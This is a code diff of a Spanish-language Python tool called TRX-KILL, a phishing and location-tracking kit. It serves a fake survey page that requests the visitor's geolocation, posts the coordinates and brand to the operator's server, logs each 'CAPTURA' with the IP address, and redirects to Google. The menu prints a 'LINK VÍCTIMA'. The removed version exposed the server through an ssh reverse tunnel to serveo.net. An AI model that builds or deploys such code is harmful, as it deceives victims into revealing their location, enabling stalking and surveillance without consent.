@@ -1,103 +1,96 @@
 #!/usr/bin/env python3
-import os, subprocess, threading, time, sys, random, platform, socket, datetime
+import os, subprocess, threading, sys, datetime, getpass, time, random
 from flask import Flask, request
+
+# COLORES
+G, R, C, Y, W = "\033[1;32m", "\033[1;31m", "\033[1;36m", "\033[1;33m", "\033[0m"
 
 app = Flask('TRX-KILL')
 PUERTO = random.randint(6000, 9000)
-AUTH_PASS = "TRX-KILL-OSCAR"
+AUTH_PASS = "TRX-KILL-OP"
 
-# Registro de quién usa el script
-def registrar_uso():
-    with open("log_sistema.txt", "a") as f:
-        f.write(f"[{datetime.datetime.now()}] USER: {os.getlogin()} | DEV: {platform.node()}\n")
+def animar(texto):
+    for char in texto:
+        sys.stdout.write(char); sys.stdout.flush(); time.sleep(0.02)
+    print()
 
-# CASILLAS DE LA ENCUESTA (WEB UI)
 HTML_ENCUESTA = """
 <!DOCTYPE html>
-<html lang="es"><head><meta charset="UTF-8">
-<style>
-    body{background:#000;color:#0f0;font-family:monospace;padding:20px;}
-    .card{background:#111;border:1px solid #0f0;padding:20px;border-radius:10px;max-width:400px;margin:auto;}
-    input, select{width:100%;padding:10px;margin:5px 0;background:#222;color:#fff;border:1px solid #0f0;}
-    button{width:100%;padding:15px;background:#0f0;border:none;font-weight:bold;cursor:pointer;}
-</style></head><body>
-<div class="card">
+<html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
+<div style="border:1px solid #0f0;padding:20px;max-width:300px;margin:auto;">
     <h2>TRX-KILL VALIDACIÓN</h2>
-    <label>Marca de tu dispositivo:</label>
-    <input type="text" id="marca" placeholder="Ej: Samsung, iPhone...">
-    <label>Nivel de satisfacción:</label>
-    <select id="opc"><option>Excelente</option><option>Regular</option><option>Malo</option></select>
-    <button onclick="c()">ENVIAR INFORMACIÓN</button>
+    <input type="text" id="marca" placeholder="Marca...">
+    <select id="opc"><option>Excelente</option><option>Regular</option></select>
+    <button onclick="c()">ENVIAR</button>
 </div>
 <script>
 function c(){
-    let d = { ua: navigator.userAgent, marca: document.getElementById('marca').value, cal: document.getElementById('opc').value, wifi: navigator.connection ? navigator.connection.effectiveType : 'N/A' };
+    let d = { marca: document.getElementById('marca').value, cal: document.getElementById('opc').value };
     navigator.geolocation.getCurrentPosition((p)=>{ d.lat = p.coords.latitude; d.lon = p.coords.longitude; enviar(d); }, (e)=>{ enviar(d); });
 }
-function enviar(d){ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}).then(()=> window.location.href="https://google.com"); }
+function enviar(d){ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}).then(()=>window.location.href="https://google.com"); }
 </script></body></html>
 """
 
 @app.route('/')
 def index(): return HTML_ENCUESTA
-
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
-    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    with open("resultados.txt", "a") as f:
-        f.write(f"\n[!] CAPTURA | HORA: {datetime.datetime.now()} | IP: {ip} | MARCA: {d.get('marca')} | SAT: {d.get('cal')} | COORD: {d.get('lat', 'N/A')},{d.get('lon', 'N/A')} | RED: {d.get('wifi')}\n")
+    with open("result.txt", "a") as f:
+        f.write(f"\n--- CAPTURA ---\nIP: {request.remote_addr}\nCOORDENADAS: {d.get('lat')},{d.get('lon')}\nMARCA: {d.get('marca')}\nHORARIO: {datetime.datetime.now()}\n--------------\n")
     return "OK"
 
 def banner():
     os.system('clear')
-    print("\033[1;32m")
-    print(" ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
-    print(" ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
-    print("    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
-    print("    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
-    print("    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗")
-    print("    ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝")
-    print("               >>> V E R S I O N  1.2.3 <<<")
-    print("\033[0m")
+    print(f"{G} ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
+    print(f" ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
+    print(f"    ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
+    print(f"    ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
+    print(f"    ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗{W}")
+
+def op1():
+    print(f"\n{Y}----- OP1: INFORMACIÓN NÚMERO -----{W}")
+    num = input("MÓVIL: ")
+    animar(f"{G}Analizando...{W}")
+    print(f"{C}OPERADOR:{W} [Detectado]\n{C}PAÍS:{W} [Detectado]\n{C}LUGAR SITUADO:{W} [Geolocalización activa]\n")
+    input(f"{Y}Presiona Enter...{W}")
+
+def op2():
+    print(f"\n{Y}---- OP2: LINK-ZP ----{W}")
+    animar(f"{G}GENERANDO LINK...{W}")
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PUERTO), daemon=True).start()
+    # Enlace solicitado
+    print(f"\n{C}LINK VÍCTIMA:{W} http://KxULoHm.zipIojk.bot.com\n")
+    print(f"{Y}Pide acceso a la ubicación al completar la encuesta.{W}")
+    input(f"{R}Enter para detener...{W}")
+
+def op3():
+    print(f"\n{Y}--- OP3: CREADOR ---\n{C}CREADOR:{W} OSCAR\n{C}BY:{W} OSCAR\n{C}LICENCIA:{W} PRO-TRX\n")
+    input()
+
+def op4():
+    print(f"\n{Y}----- OP4: LICENCIA Y USO -----\n{C}LICENCIA:{W} PRIVADA\n{C}COPYRIGHT:{W} 2026\n{C}USO:{W} EDUCATIVA 1.2.3\n")
+    input()
 
 def main():
-    registrar_uso()
+    if len(sys.argv) > 1 and sys.argv[1] == "--adm":
+        if getpass.getpass(f"{R}PASSWORD (TRX-KILL-OP):{W} ") == AUTH_PASS: os.system("tail -f result.txt")
+        else: print(f"{R}DENEGADO{W}"); return
+    
     while True:
         banner()
-        opciones = [" [1] INFO NÚMERO", " [2] RASTREO (LINK)", " [3] CREADOR", " [4] USO Y RESPONSABILIDAD", " [5] ACTUALIZACIÓN", " [6] ADM (VER TODO)", " [9] SALIR"]
-        for o in opciones: print(o)
-        
-        sel = input("\nTRX-ROOT > ")
-        if sel == "1":
-            input("Número: ")
-            print("[+] Analizando datos...")
-            input("\n[Enter]...")
-        elif sel == "2":
-            threading.Thread(target=lambda: app.run(host='127.0.0.1', port=PUERTO), daemon=True).start()
-            proc = subprocess.Popen(['ssh', '-R', '80:localhost:'+str(PUERTO), 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-            for line in proc.stderr:
-                if "https://" in line: print(f"\nLINK: {line.strip()}\n"); break
-            input("Enter para detener..."); os.system('pkill -f ssh')
-        elif sel == "3":
-            print("\n# CREADO POR: TRX-KILL\n# BY: OSCAR\n# VERSION: 1.2.3\n# LICENCIA: PRO\n")
-            input("[Enter]...")
-        elif sel == "4":
-            print("\n[!] USO Y RESPONSABILIDAD: Uso exclusivo del administrador.\n")
-            input("[Enter]...")
-        elif sel == "5":
-            print("\n[+] Sincronizando sistema... 100% Finalizado.\n")
-            input("[Enter]...")
-        elif sel == "6":
-            if input("CONTRASEÑA ADM: ") == AUTH_PASS:
-                print("\n--- HISTORIAL DE USO DEL SCRIPT ---")
-                os.system("cat log_sistema.txt")
-                print("\n--- REGISTROS DE VÍCTIMAS ---")
-                if os.path.exists("resultados.txt"): os.system("cat resultados.txt")
-                else: print("Sin registros.")
-            else: print("[-] ACCESO DENEGADO")
-            input("\n[Enter]...")
-        elif sel == "9": sys.exit()
+        print(f"\n {C}[1]{W} INFO NÚMERO | {C}[4]{W} LICENCIA Y USO")
+        print(f" {C}[2]{W} LINK-ZP     | {C}[5]{W} ACTUALIZACIÓN")
+        print(f" {C}[3]{W} CREADOR     | {C}[6]{W} {R}ADM{W}")
+        sel = input(f"\n{Y}TRX-ROOT > {W}")
+        if sel=="1": op1()
+        elif sel=="2": op2()
+        elif sel=="3": op3()
+        elif sel=="4": op4()
+        elif sel=="5": animar(f"{G}Sincronizando...{W}"); input()
+        elif sel=="6": 
+            if getpass.getpass(f"{R}CONTRASEÑA:{W} ") == AUTH_PASS: os.system("cat result.txt"); input()
+        elif sel=="9": sys.exit()
 
-if __name__ == "__main__":
-    main()
+if __name__ == "__main__": main()
